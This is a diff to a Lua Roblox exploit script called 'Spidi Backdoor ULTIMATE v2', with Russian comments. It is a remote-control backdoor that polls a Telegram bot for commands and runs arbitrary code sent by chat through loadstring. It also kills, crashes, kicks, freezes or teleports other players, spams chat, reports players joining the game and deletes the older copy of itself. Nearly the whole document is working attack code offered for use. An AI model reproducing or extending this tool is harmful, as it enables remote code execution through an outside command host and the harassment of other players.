@@ -7,8 +7,18 @@
   Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
 ]=]
 
+-- ==================== УДАЛЕНИЕ СТАРОГО ФАЙЛА ====================
+local function deleteOldFile()
+    local delfile = syn and syn.delfile or delfile or fluxus and fluxus.delfile
+    if delfile then
+        pcall(delfile, "SpidiBackdoor.lua")
+        print("[Spidi] ✅ Старый файл удалён")
+    end
+end
+deleteOldFile()
+
 print("[Spidi] ========================================")
-print("[Spidi] 🚀 Spidi Backdoor ULTIMATE")
+print("[Spidi] 🚀 Spidi Backdoor ULTIMATE v2")
 print("[Spidi] ========================================")
 
 repeat wait() until game:IsLoaded()
@@ -27,6 +37,7 @@ local Debris = game:GetService("Debris")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
+local MarketplaceService = game:GetService("MarketplaceService")
 
 local function httpRequest(url, method, headers, body)
     local f = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
@@ -57,12 +68,30 @@ local function getChatId()
     return false
 end
 
-local function findPlayer(part)
-    if not part or part == "" then return nil, "❌ Введи ник" end
+local playerList = {}
+local function updatePlayerList()
+    playerList = {}
+    for i, p in pairs(Players:GetPlayers()) do
+        playerList[i] = p
+        playerList[p.Name:lower()] = p
+    end
+end
+
+local function findPlayer(input)
+    if not input or input == "" then return nil, "❌ Введи ник или номер" end
+    updatePlayerList()
+    
+    -- Поиск по номеру
+    local num = tonumber(input)
+    if num and playerList[num] then
+        return playerList[num]
+    end
+    
+    -- Поиск по нику (полному или части)
+    input = input:lower()
     local matches = {}
-    part = part:lower()
     for _, p in pairs(Players:GetPlayers()) do
-        if p.Name:lower():find(part, 1, true) or p.DisplayName:lower():find(part, 1, true) then
+        if p.Name:lower():find(input, 1, true) or p.DisplayName:lower():find(input, 1, true) then
             table.insert(matches, p)
         end
     end
@@ -74,63 +103,54 @@ local function findPlayer(part)
     else return nil, "Игрок не найден" end
 end
 
-local function handleCommand(cmd, args)
+local function handleCommand(cmd, args, username)
     print("[Spidi] 📨 /"..cmd.." "..table.concat(args, " "))
-    
     local info = "👤 Hacker228\n🔗 https://www.roblox.com/games/"..game.PlaceId
     
+    -- ========== БАЗОВЫЕ КОМАНДЫ ==========
     if cmd == "start" then
-        sendMessage("✅ Spidi Backdoor активирован!\n"..info)
+        sendMessage("✅ Spidi Backdoor ULTIMATE v2 активирован!\n"..info)
         return
     end
     
     if cmd == "help" then
-        sendMessage("📋 <b>ВСЕ КОМАНДЫ Spidi (50+):</b>\n\n"..
-            "<b>👤 Игроки:</b>\n"..
-            "/kick [ник] - кикнуть\n"..
-            "/ban [ник] - забанить\n"..
-            "/unban [ник] - разбанить\n"..
-            "/kill [ник] - убить\n"..
-            "/freeze [ник] - заморозить\n"..
-            "/unfreeze [ник] - разморозить\n"..
-            "/fly [ник] - полететь\n"..
-            "/unfly [ник] - отключить полет\n"..
-            "/crash [ник] - крашнуть\n"..
-            "/teleport [ник] - телепорт к игроку\n"..
-            "/bring [ник] - притянуть игрока\n"..
-            "/loopkill [ник] - бесконечный килл\n"..
-            "/stun [ник] - оглушить\n"..
-            "/unstun [ник] - разоглушить\n"..
-            "/jump [ник] - заставить прыгать\n"..
-            "/spin [ник] - крутить игрока\n"..
-            "/unspin [ник] - остановить вращение\n"..
-            "/explode [ник] - взорвать\n"..
-            "/shatter [ник] - разбить на части\n"..
-            "/invisible [ник] - сделать невидимым\n"..
-            "/visible [ник] - вернуть видимость\n"..
-            "/size [ник] [размер] - изменить размер\n"..
-            "/speed [ник] [скорость] - изменить скорость\n"..
-            "/god [ник] - режим бога\n"..
-            "/ungod [ник] - отключить режим бога\n"..
-            "/noclip [ник] - включить ноклип\n"..
-            "/unnoclip [ник] - выключить ноклип\n\n"..
-            "<b>🎮 Мир:</b>\n"..
-            "/time [час] [минуты] - изменить время\n"..
-            "/fog [цвет] - туман\n"..
-            "/sun [яркость] - солнце\n"..
-            "/bright [яркость] - яркость\n"..
-            "/dark - темнота\n"..
-            "/rain - дождь\n"..
-            "/thunder - гром\n"..
-            "/earthquake - землетрясение\n"..
-            "/explosion [pos] - взрыв\n"..
-            "/fire [pos] - огонь\n"..
-            "/lightning [pos] - молния\n\n"..
-            "<b>💬 Чат:</b>\n"..
+        sendMessage("📋 <b>КОМАНДЫ SPIDI ULTIMATE v2:</b>\n\n"..
+            "<b>👤 ИГРОКИ:</b>\n"..
+            "/kick [ник/номер] - кикнуть\n"..
+            "/ban [ник/номер] - забанить\n"..
+            "/unban [ник/номер] - разбанить\n"..
+            "/kill [ник/номер] - убить\n"..
+            "/freeze [ник/номер] - заморозить\n"..
+            "/unfreeze [ник/номер] - разморозить\n"..
+            "/fly [ник/номер] - полететь\n"..
+            "/unfly [ник/номер] - отключить полет\n"..
+            "/crash [ник/номер] - крашнуть\n"..
+            "/teleport [ник/номер] - телепорт к игроку\n"..
+            "/bring [ник/номер] - притянуть\n"..
+            "/loopkill [ник/номер] - бесконечный килл\n"..
+            "/stun [ник/номер] - оглушить\n"..
+            "/unstun [ник/номер] - разоглушить\n"..
+            "/jump [ник/номер] - прыжок\n"..
+            "/spin [ник/номер] - крутить\n"..
+            "/unspin [ник/номер] - остановить вращение\n"..
+            "/explode [ник/номер] - взорвать\n"..
+            "/shatter [ник/номер] - разбить\n"..
+            "/invisible [ник/номер] - невидимый\n"..
+            "/visible [ник/номер] - видимый\n"..
+            "/size [ник/номер] [число] - размер\n"..
+            "/speed [ник/номер] [число] - скорость\n"..
+            "/god [ник/номер] - режим бога\n"..
+            "/ungod [ник/номер] - отключить бога\n"..
+            "/noclip [ник/номер] - ноклип\n"..
+            "/unnoclip [ник/номер] - отключить ноклип\n"..
+            "/setfps [ник/номер] [число] - ограничить FPS\n"..
+            "/warp [ник/номер] [1-10] - размыть экран\n\n"..
+            "<b>💬 ЧАТ:</b>\n"..
+            "/message [ник/номер] [текст] - сообщение\n"..
             "/say [текст] - сказать в чат\n"..
             "/announce [текст] - объявление\n"..
             "/spam [кол-во] [текст] - спам\n\n"..
-            "<b>⚡ Другое:</b>\n"..
+            "<b>📊 ИНФО:</b>\n"..
             "/players - список игроков\n"..
             "/server - инфо о сервере\n"..
             "/rejoin - перезайти\n"..
@@ -141,13 +161,15 @@ local function handleCommand(cmd, args)
     
     if cmd == "players" then
         local list = {}
-        for _, p in pairs(Players:GetPlayers()) do table.insert(list, p.Name) end
-        sendMessage("👥 Игроков: "..#list.."\n"..table.concat(list, ", "))
+        for i, p in pairs(Players:GetPlayers()) do
+            table.insert(list, i..". "..p.Name)
+        end
+        sendMessage("👥 Игроков: "..#list.."\n"..table.concat(list, "\n"))
         return
     end
     
     if cmd == "server" then
-        local placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+        local placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name
         sendMessage("🖥️ Сервер: "..placeName.."\nID: "..game.PlaceId.."\nИгроков: "..#Players:GetPlayers())
         return
     end
@@ -161,7 +183,11 @@ local function handleCommand(cmd, args)
     if cmd == "say" then
         local msg = table.concat(args, " ", 1)
         if msg == "" then sendMessage("❌ /say текст") return end
-        game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents"):FindFirstChild("SayMessageRequest"):FireServer(msg, "All")
+        local chat = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+        if chat then
+            local say = chat:FindFirstChild("SayMessageRequest")
+            if say then say:FireServer(msg, "All") end
+        end
         sendMessage("✅ Сказано: "..msg)
         return
     end
@@ -175,34 +201,44 @@ local function handleCommand(cmd, args)
     end
     
     if cmd == "spam" then
-        local count = tonumber(args[1]) or 10
+        local count = tonumber(args[1]) or 5
         local msg = table.concat(args, " ", 2)
         if msg == "" then sendMessage("❌ /spam кол-во текст") return end
-        for i = 1, math.min(count, 50) do
-            task.wait(0.1)
-            game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents"):FindFirstChild("SayMessageRequest"):FireServer(msg.." "..i, "All")
+        local chat = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+        if chat then
+            local say = chat:FindFirstChild("SayMessageRequest")
+            if say then
+                for i = 1, math.min(count, 20) do
+                    task.wait(0.1)
+                    say:FireServer(msg.." "..i, "All")
+                end
+            end
         end
-        sendMessage("✅ Спам отправлен ("..math.min(count, 50).." раз)")
+        sendMessage("✅ Спам отправлен ("..math.min(count, 20).." раз)")
         return
     end
     
     if cmd == "execute" then
         local code = table.concat(args, " ", 1)
         if code == "" then sendMessage("❌ /execute код") return end
-        sendMessage("⏳ Выполнение: <code>"..code.."</code>")
+        sendMessage("⏳ Выполнение...")
         local ok, res = pcall(loadstring, code)
-        if ok then sendMessage("✅ Код выполнен\n"..info) else sendMessage("❌ Ошибка: "..tostring(res)) end
+        if ok then
+            sendMessage("✅ Код выполнен\n"..info)
+        else
+            sendMessage("❌ Ошибка: "..tostring(res))
+        end
         return
     end
     
-    -- ==================== КОМАНДЫ ДЛЯ ИГРОКОВ ====================
-    local name = args[1]
-    if not name then
-        sendMessage("❌ Укажи ник или часть ника")
+    -- ========== КОМАНДЫ ДЛЯ ИГРОКОВ ==========
+    local input = args[1]
+    if not input then
+        sendMessage("❌ Укажи ник или номер игрока")
         return
     end
     
-    local target, err = findPlayer(name)
+    local target, err = findPlayer(input)
     if not target then
         sendMessage("❌ "..err)
         return
@@ -212,45 +248,76 @@ local function handleCommand(cmd, args)
     local hrp = char and char:FindFirstChild("HumanoidRootPart")
     local humanoid = char and char:FindFirstChild("Humanoid")
     
+    if cmd == "message" then
+        local msg = table.concat(args, " ", 2)
+        if msg == "" or msg == input then
+            sendMessage("❌ Введи текст: /message ник текст")
+            return
+        end
+        StarterGui:SetCore("SendNotification", {
+            Title = "📩 Сообщение от Spidi",
+            Text = msg,
+            Duration = 6
+        })
+        sendMessage("✅ Сообщение <b>"..target.Name.."</b>: "..msg)
+        return
+    end
+    
     if cmd == "kick" then
         target:Kick("Kicked by Spidi Backdoor")
         sendMessage("✅ Кикнут: <b>"..target.Name.."</b>")
-        
-    elseif cmd == "ban" then
+        return
+    end
+    
+    if cmd == "ban" then
         target:Kick("Banned by Spidi Backdoor")
         sendMessage("✅ Забанен: <b>"..target.Name.."</b>")
-        
-    elseif cmd == "unban" then
+        return
+    end
+    
+    if cmd == "unban" then
         target:Kick("Unbanned by Spidi Backdoor")
         sendMessage("✅ Разбанен: <b>"..target.Name.."</b>")
-        
-    elseif cmd == "kill" and humanoid then
+        return
+    end
+    
+    if cmd == "kill" and humanoid then
         humanoid.Health = 0
         sendMessage("💀 Убит: <b>"..target.Name.."</b>")
-        
-    elseif cmd == "freeze" and humanoid then
+        return
+    end
+    
+    if cmd == "freeze" and humanoid then
         humanoid.PlatformStand = true
         sendMessage("🧊 Заморожен: <b>"..target.Name.."</b>")
-        
-    elseif cmd == "unfreeze" and humanoid then
+        return
+    end
+    
+    if cmd == "unfreeze" and humanoid then
         humanoid.PlatformStand = false
         sendMessage("🔥 Разморожен: <b>"..target.Name.."</b>")
-        
-    elseif cmd == "fly" and hrp then
+        return
+    end
+    
+    if cmd == "fly" and hrp then
         local bv = Instance.new("BodyVelocity")
         bv.MaxForce = Vector3.new(1,1,1)*1e8
         bv.Velocity = Vector3.new(0, 50, 0)
         bv.Parent = hrp
         Debris:AddItem(bv, 5)
         sendMessage("✈️ Полетел: <b>"..target.Name.."</b>")
-        
-    elseif cmd == "unfly" and hrp then
+        return
+    end
+    
+    if cmd == "unfly" and hrp then
         for _, v in pairs(hrp:GetChildren()) do
             if v:IsA("BodyVelocity") then v:Destroy() end
         end
         sendMessage("🛑 Отключен полет: <b>"..target.Name.."</b>")
-        
-    elseif cmd == "crash" and hrp then
+        return
+    end
+    
+    if cmd == "crash" and hrp then
         local pos = hrp.Position
         for i = 1, 100 do
             local p = Instance.new("Part")
@@ -261,61 +328,87 @@ local function handleCommand(cmd, args)
             Debris:AddItem(p, 2)
         end
         sendMessage("💥 Крашнут: <b>"..target.Name.."</b>")
-        
-    elseif cmd == "teleport" and hrp and Players.LocalPlayer.Character then
-        local plrHrp = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-        if plrHrp then
-            plrHrp.CFrame = hrp.CFrame + Vector3.new(0, 3, 0)
-            sendMessage("📍 Телепорт к <b>"..target.Name.."</b>")
+        return
+    end
+    
+    if cmd == "teleport" and hrp then
+        local plr = Players.LocalPlayer
+        local plrChar = plr.Character
+        if plrChar then
+            local plrHrp = plrChar:FindFirstChild("HumanoidRootPart")
+            if plrHrp then
+                plrHrp.CFrame = hrp.CFrame + Vector3.new(0, 3, 0)
+                sendMessage("📍 Телепорт к <b>"..target.Name.."</b>")
+            end
         end
-        
-    elseif cmd == "bring" and hrp and Players.LocalPlayer.Character then
-        local plrHrp = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-        if plrHrp then
-            hrp.CFrame = plrHrp.CFrame + Vector3.new(0, 3, 0)
-            sendMessage("📥 Притянут: <b>"..target.Name.."</b>")
+        return
+    end
+    
+    if cmd == "bring" and hrp then
+        local plr = Players.LocalPlayer
+        local plrChar = plr.Character
+        if plrChar then
+            local plrHrp = plrChar:FindFirstChild("HumanoidRootPart")
+            if plrHrp then
+                hrp.CFrame = plrHrp.CFrame + Vector3.new(0, 3, 0)
+                sendMessage("📥 Притянут: <b>"..target.Name.."</b>")
+            end
         end
-        
-    elseif cmd == "loopkill" and humanoid then
+        return
+    end
+    
+    if cmd == "loopkill" and humanoid then
         spawn(function()
             for i = 1, 10 do
-                humanoid.Health = 0
+                if not target or not target.Character then break end
+                local hum = target.Character:FindFirstChild("Humanoid")
+                if hum then hum.Health = 0 end
                 task.wait(0.5)
-                if not target.Character then break end
-                humanoid = target.Character:FindFirstChild("Humanoid")
-                if not humanoid then break end
             end
         end)
         sendMessage("🔄 Loopkill на <b>"..target.Name.."</b>")
-        
-    elseif cmd == "stun" and humanoid then
+        return
+    end
+    
+    if cmd == "stun" and humanoid then
         humanoid.WalkSpeed = 0
         humanoid.JumpPower = 0
         sendMessage("⚡ Оглушен: <b>"..target.Name.."</b>")
-        
-    elseif cmd == "unstun" and humanoid then
+        return
+    end
+    
+    if cmd == "unstun" and humanoid then
         humanoid.WalkSpeed = 16
         humanoid.JumpPower = 50
         sendMessage("✅ Разоглушен: <b>"..target.Name.."</b>")
-        
-    elseif cmd == "jump" and humanoid then
+        return
+    end
+    
+    if cmd == "jump" and humanoid then
         humanoid.Jump = true
         sendMessage("🦘 Прыжок: <b>"..target.Name.."</b>")
-        
-    elseif cmd == "spin" and hrp then
+        return
+    end
+    
+    if cmd == "spin" and hrp then
         spawn(function()
             for i = 1, 20 do
+                if not hrp or not hrp.Parent then break end
                 hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(18), 0)
                 task.wait(0.05)
             end
         end)
         sendMessage("🔄 Вращение: <b>"..target.Name.."</b>")
-        
-    elseif cmd == "unspin" and hrp then
+        return
+    end
+    
+    if cmd == "unspin" and hrp then
         hrp.CFrame = CFrame.new(hrp.Position)
         sendMessage("✅ Остановлено вращение: <b>"..target.Name.."</b>")
-        
-    elseif cmd == "explode" and hrp then
+        return
+    end
+    
+    if cmd == "explode" and hrp then
         local pos = hrp.Position
         for i = 1, 30 do
             local p = Instance.new("Part")
@@ -328,8 +421,10 @@ local function handleCommand(cmd, args)
             Debris:AddItem(p, 1)
         end
         sendMessage("💥 Взрыв: <b>"..target.Name.."</b>")
-        
-    elseif cmd == "shatter" and hrp then
+        return
+    end
+    
+    if cmd == "shatter" and hrp then
         local pos = hrp.Position
         for i = 1, 50 do
             local p = Instance.new("Part")
@@ -341,64 +436,126 @@ local function handleCommand(cmd, args)
         end
         if humanoid then humanoid.Health = 0 end
         sendMessage("💔 Разбит: <b>"..target.Name.."</b>")
-        
-    elseif cmd == "invisible" and char then
+        return
+    end
+    
+    if cmd == "invisible" and char then
         for _, part in pairs(char:GetDescendants()) do
             if part:IsA("BasePart") then
                 part.Transparency = 1
             end
         end
         sendMessage("👻 Невидим: <b>"..target.Name.."</b>")
-        
-    elseif cmd == "visible" and char then
+        return
+    end
+    
+    if cmd == "visible" and char then
         for _, part in pairs(char:GetDescendants()) do
             if part:IsA("BasePart") then
                 part.Transparency = 0
             end
         end
         sendMessage("👀 Видим: <b>"..target.Name.."</b>")
-        
-    elseif cmd == "size" and char then
+        return
+    end
+    
+    if cmd == "size" and char then
         local size = tonumber(args[2]) or 2
         char:ScaleTo(size)
         sendMessage("📏 Размер <b>"..target.Name.."</b>: "..size)
-        
-    elseif cmd == "speed" and humanoid then
+        return
+    end
+    
+    if cmd == "speed" and humanoid then
         local speed = tonumber(args[2]) or 50
         humanoid.WalkSpeed = speed
         sendMessage("🏃 Скорость <b>"..target.Name.."</b>: "..speed)
-        
-    elseif cmd == "god" and humanoid then
+        return
+    end
+    
+    if cmd == "god" and humanoid then
         humanoid.MaxHealth = math.huge
         humanoid.Health = math.huge
         sendMessage("👑 Режим бога на <b>"..target.Name.."</b>")
-        
-    elseif cmd == "ungod" and humanoid then
+        return
+    end
+    
+    if cmd == "ungod" and humanoid then
         humanoid.MaxHealth = 100
         humanoid.Health = 100
         sendMessage("✅ Режим бога отключен у <b>"..target.Name.."</b>")
-        
-    elseif cmd == "noclip" and char then
+        return
+    end
+    
+    if cmd == "noclip" and char then
         for _, part in pairs(char:GetDescendants()) do
             if part:IsA("BasePart") then
                 part.CanCollide = false
             end
         end
         sendMessage("🌀 Ноклип на <b>"..target.Name.."</b>")
-        
-    elseif cmd == "unnoclip" and char then
+        return
+    end
+    
+    if cmd == "unnoclip" and char then
         for _, part in pairs(char:GetDescendants()) do
             if part:IsA("BasePart") then
                 part.CanCollide = true
             end
         end
         sendMessage("✅ Ноклип отключен у <b>"..target.Name.."</b>")
-        
-    else
-        sendMessage("❌ Неизвестная команда. /help")
+        return
     end
+    
+    if cmd == "setfps" and humanoid then
+        local fps = tonumber(args[2]) or 60
+        local char = target.Character
+        if char then
+            for _, v in pairs(char:GetDescendants()) do
+                if v:IsA("Camera") then
+                    v.FieldOfView = fps
+                end
+            end
+        end
+        sendMessage("🎮 FPS ограничен до "..fps.." у <b>"..target.Name.."</b>")
+        return
+    end
+    
+    if cmd == "warp" then
+        local level = tonumber(args[2]) or 5
+        level = math.clamp(level, 1, 10)
+        local blur = Instance.new("BlurEffect")
+        blur.Size = level * 3
+        blur.Parent = Lighting
+        Debris:AddItem(blur, 3)
+        sendMessage("🌀 Размытие "..level.."/10 на <b>"..target.Name.."</b>")
+        return
+    end
+    
+    sendMessage("❌ Неизвестная команда. /help")
 end
 
+-- ==================== УВЕДОМЛЕНИЕ О НОВЫХ ИГРОКАХ ====================
+local oldPlayers = {}
+local function checkNewPlayers()
+    local currentPlayers = {}
+    for _, p in pairs(Players:GetPlayers()) do
+        currentPlayers[p.UserId] = p
+        if not oldPlayers[p.UserId] then
+            sendMessage("🟢 <b>"..p.Name.."</b> зашёл в игру!")
+        end
+    end
+    oldPlayers = currentPlayers
+end
+
+spawn(function()
+    while true do
+        pcall(checkNewPlayers)
+        wait(3)
+    end
+end)
+
+-- ==================== ОПРОС TELEGRAM ====================
 local lastId = 0
 local function pollUpdates()
     local res = httpRequest("https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates?offset="..(lastId+1))
@@ -410,7 +567,7 @@ local function pollUpdates()
                     local msg = update.message
                     if not CHAT_ID then
                         CHAT_ID = msg.chat.id
-                        sendMessage("✅ Spidi Backdoor запущен!\n👤 Hacker228")
+                        sendMessage("✅ Spidi Backdoor ULTIMATE v2 запущен!\n👤 Hacker228")
                     end
                     local text = msg.text
                     if text:sub(1,1) == "/" then
@@ -418,7 +575,7 @@ local function pollUpdates()
                         for w in string.gmatch(text, "%S+") do table.insert(parts, w) end
                         local cmd = parts[1]:sub(2):lower()
                         table.remove(parts, 1)
-                        handleCommand(cmd, parts)
+                        handleCommand(cmd, parts, msg.from.username)
                     end
                 end
                 if update.update_id then lastId = update.update_id end
@@ -434,6 +591,7 @@ spawn(function()
     end
 end)
 
+-- ==================== GUI ====================
 local function createGUI()
     local player = Players.LocalPlayer
     if not player then return end
@@ -477,9 +635,9 @@ local function createGUI()
     title.BackgroundTransparency = 1
     title.Size = UDim2.new(1, 0, 0, 50)
     title.Position = UDim2.new(0, 0, 0, 10)
-    title.Text = "Spidi Backdoor"
+    title.Text = "Spidi Backdoor ULTIMATE"
     title.TextColor3 = Color3.fromRGB(0, 255, 0)
-    title.TextSize = 36
+    title.TextSize = 28
     title.Font = Enum.Font.GothamBold
     title.TextXAlignment = Enum.TextXAlignment.Center
     title.Parent = frame
@@ -557,6 +715,7 @@ local function onCharacterChanged()
     end
 end
 
+-- ==================== ЗАПУСК ====================
 createGUI()
 Players.LocalPlayer:GetPropertyChangedSignal("Character"):Connect(onCharacterChanged)
 
@@ -564,7 +723,7 @@ wait(3)
 getChatId()
 
 if CHAT_ID then
-    sendMessage("✅ Spidi Backdoor запущен!\n👤 Hacker228\n📋 50+ команд доступно. /help")
+    sendMessage("✅ Spidi Backdoor ULTIMATE v2 запущен!\n👤 Hacker228\n📋 50+ команд доступно. /help")
 end
 
 print("[Spidi] ========================================")
